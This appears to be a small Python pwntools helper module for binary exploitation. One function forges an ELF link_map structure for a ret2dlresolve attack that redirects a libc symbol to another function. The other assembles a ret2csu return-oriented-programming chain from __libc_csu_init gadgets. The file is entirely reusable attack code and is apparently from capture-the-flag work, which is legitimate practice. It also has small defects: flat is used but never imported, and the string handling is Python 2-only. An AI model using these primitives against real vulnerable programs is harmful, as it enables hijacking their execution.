from pwn import p64
def fake_link_map(code, libc, link_map_addr, src_func, dst_func):
    '''
    prerequisite: 
        arch == amd64 && *((char*)code.got[src_func]-3)=="\x03" (st_other == 3)
    usage:
        push 0 
        push fake_link_map
        jmp plt0+6
    '''
    #r_info = 0x0000000b00000007
    r_info = 7
    offset = (libc.sym[dst_func] - libc.sym[src_func]) % 2**64
    r_offset = (link_map_addr-8-offset) % 2**64# rel_addr = link_map_addr - 8 writable
    link_map = ''
    link_map += p64(offset)                    # 0x00, l_addr
    link_map = link_map.ljust(0x28, '\x00')
    link_map += p64(code.got[src_func]-8)      # symtab
    link_map = link_map.ljust(0x68, '\x00')
    link_map += p64(link_map_addr + 0x28 - 8)  # 0x68, strtab_ptr - 8, any readable memory?
    link_map += p64(link_map_addr + 0x20)      # 0x70, symtab_ptr - 8
    link_map = link_map.ljust(0xf8, '\x00')
    link_map += p64(link_map_addr + 0xf8)      # 0xf8, jmprel_ptr - 8
    link_map += p64(link_map_addr + 0x108)     # jmp_rel
    link_map += p64(r_offset)                  # reloc, 0x00, r_offset_base_address link_map_addr+0x108
    link_map += p64(r_info)                    # reloc, 0x08, r_info
    return link_map

def csu_rop(csu_init, function_ptr, args, rbp=None):
    caller, poper = csu_init
    if not rbp:
        rop = [poper,
               0,               # rbx
               1,               # rbp
               function_ptr,    # r12
               args[2],         # r13
               args[1],         # r14
               args[0],         # r15
               caller,
               ] + [0xdeadbeef] * 7
    else:
        rop = [poper,
               0,               # rbx
               1,               # rbp
               function_ptr,    # r12
               args[2],         # r13
               args[1],         # r14
               args[0],         # r15
               caller,
               ] + [1,2,rbp,4,5,6,7]
    return flat(rop)
